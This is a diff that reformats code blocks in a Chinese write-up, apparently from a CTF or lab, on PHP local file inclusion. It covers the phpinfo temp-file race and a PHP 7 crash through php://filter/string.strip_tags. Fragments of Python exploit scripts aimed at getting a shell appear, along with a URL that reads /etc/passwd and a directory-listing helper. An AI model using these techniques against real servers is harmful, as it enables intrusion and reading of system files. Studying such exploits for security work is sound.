@@ -63,8 +63,9 @@ phpinfo+LFI
 
 即利用phpinfo会打印上传缓存文件路径的特性，进行缓存文件包含达到getshell的目的。
 
+
 我们简单写一个测试脚本：
-`
+```
 import requests
 from io import BytesIO
 files = {
@@ -174,8 +175,8 @@ res = phpinfo_LFI(host,port,offset,request1,request2)
 if res is not None:
 print 'You can getshell with /tmp/_POST!'
 break
-`
-LFI+php7崩溃
+```
+LFI+php7崩溃:
 
 前一题我们能做，得益于phpinfo的存在，但如果没有phpinfo的存在，我们就很难利用上述方法去getshell。
 
@@ -188,18 +189,19 @@ LFI+php7崩溃
 `http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd`
 
 加上我们有dir.php
-`
+```
 <?php
 $a = @$_GET['dir'];
 if(!$a){
 $a = '/tmp';
 }
 var_dump(scandir($a));
-`
+```
+
 可以进行目录列举，我们只要找到临时文件名即可：
 
 编写exp
-`
+```
 import requests
 from io import BytesIO
 import re
@@ -219,4 +221,4 @@ data = {
 }
 r =  requests.post(url=url,data=data)
 print r.content
-`
+```
